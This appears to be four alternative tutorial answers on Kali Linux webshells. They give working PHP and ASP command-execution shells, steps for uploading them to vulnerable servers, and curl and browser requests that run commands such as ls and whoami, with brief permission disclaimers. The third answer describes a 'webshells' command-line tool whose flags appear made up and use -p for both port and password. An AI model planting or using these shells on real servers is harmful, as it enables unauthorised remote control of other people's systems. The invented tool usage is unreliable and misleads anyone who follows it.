# webshells
Webshells are scripts that allow remote access and management of a web server. They are often used for legitimate administration tasks but can also be exploited by attackers. In Kali Linux, various webshells can be deployed to test web application security.

### Common Webshells

1. **PHP Webshells**: Simple PHP scripts that provide a web interface to execute commands.
2. **ASP Webshells**: Similar to PHP but designed for ASP.NET environments.
3. **Python Webshells**: Utilizes Python scripts for executing commands.

### Usage

#### Example 1: Simple PHP Webshell

1. **Create a Webshell**:
   Save the following PHP code as `webshell.php`:

   ```php
   <?php
   if (isset($_REQUEST['cmd'])) {
       system($_REQUEST['cmd']);
   }
   ?>
   ```

2. **Upload the Webshell**:
   Upload `webshell.php` to a vulnerable web server.

3. **Access the Webshell**:
   Visit the webshell in your browser:

   ```
   http://target.com/webshell.php?cmd=ls
   ```

4. **Output**:
   The output will be the result of the command executed on the server, like a directory listing.

#### Example 2: ASP Webshell

1. **Create an ASP Webshell**:
   Save the following code as `webshell.asp`:

   ```asp
   <% 
   If Request("cmd") <> "" Then 
       Set objShell = CreateObject("WScript.Shell") 
       strCommand = Request("cmd") 
       Set objExec = objShell.Exec(strCommand) 
       Response.Write(objExec.StdOut.ReadAll) 
   End If 
   %>
   ```

2. **Upload and Access**:
   Similar to the PHP example, upload it to a vulnerable ASP server and access it:

   ```
   http://target.com/webshell.asp?cmd=dir
   ```

3. **Output**:
   The output will display the result of the `dir` command.

### Conclusion

Webshells provide a powerful method for interacting with web servers, but they can pose significant security risks if not secured properly. Always ensure you have permission to test any web application to maintain ethical standards.



                         ALTERNATIVE
  ## Webshells in Kali Linux

Webshells are scripts that can be uploaded to a web server to allow remote access and control over the server. They are often used by penetration testers and ethical hackers to test the security of web applications.

### How to Use Webshells

1. **Upload the Webshell**:
   - The first step is to upload a webshell file (e.g., a PHP or ASP script) to a vulnerable web server. This can often be done through file upload vulnerabilities.

2. **Access the Webshell**:
   - Once uploaded, the webshell can be accessed via a web browser. For example, if you uploaded a PHP webshell named `shell.php` to `http://example.com/uploads/`, you would navigate to `http://example.com/uploads/shell.php`.

### Example Webshells

1. **Simple PHP Webshell**:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
   - This script allows you to execute commands on the server by passing commands as a GET parameter. For example:
     ```
     http://example.com/uploads/shell.php?cmd=ls
     ```

2. **More Advanced PHP Webshell**:
   ```php
   <?php
   if(isset($_REQUEST['cmd'])) {
       echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
   }
   ?>
   ```
   - This version displays command output in a more readable format.

### Example Output

When you use a webshell to execute a command, the output might look like this:

- **Command**: `ls`
- **Output**:
   ```
   file1.txt
   file2.txt
   directory1/
   ```

- **Command**: `whoami`
- **Output**:
   ```
   www-data
   ```

### Ethical Considerations

Using webshells can be illegal and unethical if done without permission. Always ensure you have explicit authorization before testing web applications. Use webshells responsibly for educational purposes or authorized security assessments only.



                         ALTERNATIVE
Webshells is a tool in Kali Linux that allows you to create a web-based shell on a target system, enabling remote access and command execution. Here's a brief overview of how to use Webshells:

**Installation**

Webshells is pre-installed in Kali Linux. If you don't have it, you can install it using:

```bash
sudo apt-get install webshells
```

**Basic Usage**

The basic syntax for using Webshells is:

```bash
webshells -h <target_host> -p <target_port>
```

* `-h <target_host>`: Specifies the target host IP address or hostname.
* `-p <target_port>`: Specifies the target port number.

**Examples**

1. **Simple Webshell**

Create a webshell on the target system:

```bash
webshells -h 192.168.1.100 -p 8080
```

This will create a web-based shell on the target system at `http://192.168.1.100:8080`.

2. **Customizing the Webshell**

You can customize the webshell by specifying a username and password:

```bash
webshells -h 192.168.1.100 -p 8080 -u myuser -p mypass
```

This will create a webshell with the specified username and password.

**Output**

When you access the webshell, you'll see a simple web interface with a command prompt. You can execute commands on the target system by typing them in the command prompt.

For example, if you created a webshell on `http://192.168.1.100:8080`, you can access it using a web browser and execute commands like:

```
whoami
```

The output will display the current user running the webshell.

```
uname -a
```

The output will display the system information, including the operating system and kernel version.

Remember to use Webshells responsibly and only on systems you have permission to access.



                        ALTERNATIVE
The **webshells** tool in Kali Linux is a collection of web shells designed for various web server environments, including ASP, ASPX, CFM, JSP, Perl, and PHP. Web shells are scripts that allow an attacker to execute commands on a web server, often used in post-exploitation scenarios.

### Usage of Webshells

1. **Installation**:
   To install the webshells package, you can use the following command in the terminal:
   ```bash
   sudo apt install webshells
   ```

2. **Location**:
   After installation, the web shells can be found in the `/usr/share/webshells/` directory. You can list the contents using:
   ```bash
   tree /usr/share/webshells/
   ```

3. **Types of Web Shells**:
   The webshells package includes various types of web shells categorized by the programming language:
   - **ASP**: `cmd-asp-5.1.asp`, `cmdasp.asp`
   - **ASPX**: `cmdasp.aspx`
   - **CFM**: `cfexec.cfm`
   - **JSP**: `cmdjsp.jsp`, `jsp-reverse.jsp`
   - **Perl**: `perlcmd.cgi`, `perl-reverse-shell.pl`
   - **PHP**: `php-backdoor.php`, `php-reverse-shell.php`, among others [[1]](https://www.kali.org/tools/webshells/).

### Examples of Usage

1. **Uploading a Web Shell**:
   An attacker might upload a PHP web shell (e.g., `php-backdoor.php`) to a vulnerable web server. This shell can then be accessed via a web browser or a tool like `curl`.

   Example command to execute a command using the PHP web shell:
   ```bash
   curl "http://target.com/path/to/php-backdoor.php?cmd=ls"
   ```

   This command would execute the `ls` command on the server and return the output.

2. **Using a JSP Web Shell**:
   If a JSP web shell (e.g., `cmdjsp.jsp`) is uploaded, you can execute commands similarly:
   ```bash
   curl "http://target.com/path/to/cmdjsp.jsp?cmd=whoami"
   ```

   This would return the username of the web server process.

### Expected Output

When executing commands through a web shell, the output will typically be the result of the command executed on the server. For example, if you run the command to list files:
```bash
curl "http://target.com/path/to/php-backdoor.php?cmd=ls"
```
You might see output like:
```
file1.txt
file2.txt
uploads/
```

This output indicates the files and directories present in the current directory of the web server.

### Conclusion

Webshells in Kali Linux provide a powerful means for attackers to interact with compromised web servers. They can execute commands, upload files, and perform various actions depending on the capabilities of the specific web shell used. However, it's crucial to use these tools responsibly and ethically, ensuring you have permission to test any web application.

---
Learn more:
1. [webshells | Kali Linux Tools](https://www.kali.org/tools/webshells/)
2. [Web Shells: Understanding Attackers’ Tools and Techniques | F5 Labs](https://www.f5.com/labs/learning-center/web-shells-understanding-attackers-tools-and-techniques)
3. [Spinning Webs - Unveiling Arachne for Web Shell C2 | by Cody Thomas | Posts By SpecterOps Team Members](https://posts.specterops.io/spinning-webs-unveiling-arachne-for-web-shell-c2-26c40f570ea1)
